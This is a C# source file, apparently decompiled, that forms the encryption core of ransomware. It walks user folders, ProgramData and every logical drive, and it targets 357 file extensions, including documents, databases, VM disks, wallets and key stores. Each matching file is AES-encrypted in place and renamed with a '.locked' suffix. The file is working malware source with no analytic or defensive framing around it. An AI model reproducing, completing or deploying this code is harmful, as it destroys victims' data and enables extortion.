using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.VisualBasic;

namespace SF;

internal static class Main
{
	private static readonly string Root = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static readonly string SystemDisk = Path.GetPathRoot(Root);

	public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string MyComputerDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);

	private static readonly string DesktopDirectoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static readonly string FavoritesDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

	private static readonly string MyDocumentspDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string MyMusicDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static readonly string HistoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.History);

	private static readonly string PersonalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string DownloadsDirectory = Interaction.Environ("USERPROFILE") + "\\Downloads";

	private static readonly string DocumentsDirectory = Interaction.Environ("USERPROFILE") + "\\Documents";

	private static readonly string PicturesDirectory = Interaction.Environ("USERPROFILE") + "\\Pictures";

	private static readonly string VideosDirectory = Interaction.Environ("USERPROFILE") + "\\Videos";

	private static readonly string MusicDirectory = Interaction.Environ("USERPROFILE") + "\\Music";

	private static readonly string UserProfile = Interaction.Environ("USERPROFILE");

	public static string[] ValidExtension = new string[357]
	{
		".gif", ".apk", ".groups", ".hdd", ".hpp", ".log", ".m2ts", ".m4p", ".mkv", ".mpeg",
		".epub", ".yuv", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".png",
		".qed", ".qcow", ".otp", ".s3db", ".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi",
		".vhd", ".vhdx", ".vmdk", ".vmsd", ".psafe3", ".vmx", ".vmxf", ".3fr", ".3pr", ".ab4",
		".accde", ".accdr", ".accdt", ".ach", ".acr", ".sd0", ".sxw", ".adb", ".advertisements", ".agdl",
		".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".sti", ".oil", ".backupdb", ".bay",
		".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".ycbcra", ".cdrw",
		".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2", ".pptm",
		".dcs", ".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf", ".dxg",
		".eml", ".ppt", ".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".flp", ".gray",
		".grey", ".gry", ".hbk", ".ibd", ".7z", ".ibz", ".iiq", ".incpas", ".jpe", ".kc2",
		".kdbx", ".kdc", ".kpdx", ".ldf", ".lua", ".mdc", ".mdf", ".mef", ".config", ".mfw",
		".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2",
		".ns3", ".ldf", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb", ".odf", ".odg",
		".odm", ".orf", ".otg", ".oth", ".py", ".ots", ".ott", ".p12", ".p7b", ".p7c",
		".pdd", ".pem", ".plus_muhd", ".plc", ".pot", ".pptx", ".py", ".qba", ".qbr", ".qbw",
		".qbx", ".qby", ".raf", ".rat", ".raw", ".rdb", ".rwl", ".rwz", ".conf ", ".sda",
		".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf", ".srw", ".st5", ".st8", ".std",
		".stx", ".sxd", ".sxg", ".sxi", ".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11",
		".x3f", ".xis", ".ARC", ".contact", ".dbx", ".doc", ".docx", ".jnt", ".jpg", ".msg",
		".oab", ".ods", ".pdf", ".pps", ".ppsm", ".prf", ".pst", ".rar", ".rtf", ".txt",
		".wab", ".xls", ".xlsx", ".xml", ".zip", ".1cd", ".3ds", ".3g2", ".7zip", ".accdb",
		".aoi", ".asf", ".asp", ".aspx", ".asx", ".avi", ".bak", ".cer", ".cfg", ".class",
		".cs ", ".css", ".csv", ".db", ".dds", ".dwg", ".dxf", ".flf", ".flv", ".html",
		".idx", ".js", ".key", ".kwm", ".laccdb", ".lit", ".m3u", ".mbx", ".md", ".mdf",
		".mid", ".mlb", ".mov", ".mp3", ".mp4", ".mpg", ".obj", ".odt", ".pages", ".php",
		".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf", ".thm",
		".vob", ".wav", ".wma", ".wmv", ".xlsb", ".3dm", ".aac", ".ai", ".arw", ".c",
		".cdr", ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx",
		".drw", ".dxb", ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max",
		".mdb", ".pcd", ".pct", ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm",
		".ps", ".r3d", ".rw2", ".sldm", ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam",
		".xlm", ".xlr", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".act", ".adp", ".al",
		".dip", ".docb", ".frm", ".gpg", ".jsp", ".lay", ".lay6", ".m4u", ".mml", ".myi",
		".onetoc2", ".PAQ", ".ps1", ".sch", ".slk", ".snt", ".suo", ".tgz", ".tif", ".tiff",
		".txt", ".uop", ".uot", ".vcd", ".wk1", ".wks", ".xlc"
	};

	public static string Key { get; } = KeyGenerator.GetUniqueKey(133);


	private static string[] Folder { get; set; }

	private static string[] Files { get; set; }

	private static string ProgramData { get; } = SystemDisk + "\\ProgramData";


	public static void RunEncrypt()
	{
		Encryption.Run();
		List<string> list = new List<string>
		{
			DesktopDirectory,
			MyComputerDirectory,
			DesktopDirectoryDirectory,
			MyDocumentspDirectory,
			MyMusicDirectory,
			HistoryDirectory,
			PersonalDirectory,
			DownloadsDirectory,
			DocumentsDirectory,
			PicturesDirectory,
			VideosDirectory,
			MusicDirectory,
			UserProfile,
			FavoritesDirectory,
			ProgramData,
			SystemDisk + "\\Users\\"
		};
		foreach (string item in list)
		{
			SearchFolder(item);
			SearchFile(item);
		}
	}

	internal static void SearchDisk()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (text != SystemDisk)
			{
				SearchFolder(text);
			}
			else
			{
				SearchFile(text);
			}
			SearchFile(text);
		}
	}

	internal static void SearchFolder(string name)
	{
		try
		{
			Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
		}
		catch (Exception)
		{
			return;
		}
		string[] folder = Folder;
		foreach (string name2 in folder)
		{
			SearchFile(name2);
			SearchFolder(name2);
		}
	}

	internal static void SearchFile(string name)
	{
		string[] validExtension = ValidExtension;
		foreach (string text in validExtension)
		{
			try
			{
				Files = Directory.GetFiles(name, "*" + text, SearchOption.TopDirectoryOnly);
			}
			catch (Exception)
			{
				break;
			}
			string[] files = Files;
			foreach (string name2 in files)
			{
				Encrypt(name2);
			}
		}
	}

	internal static void Encrypt(string name)
	{
		try
		{
			byte[] bytes = Encryption.AesEncrypt(File.ReadAllBytes(name), Key);
			File.WriteAllBytes(name, bytes);
			File.Move(name, name + ".locked");
		}
		catch (Exception)
		{
		}
	}
}
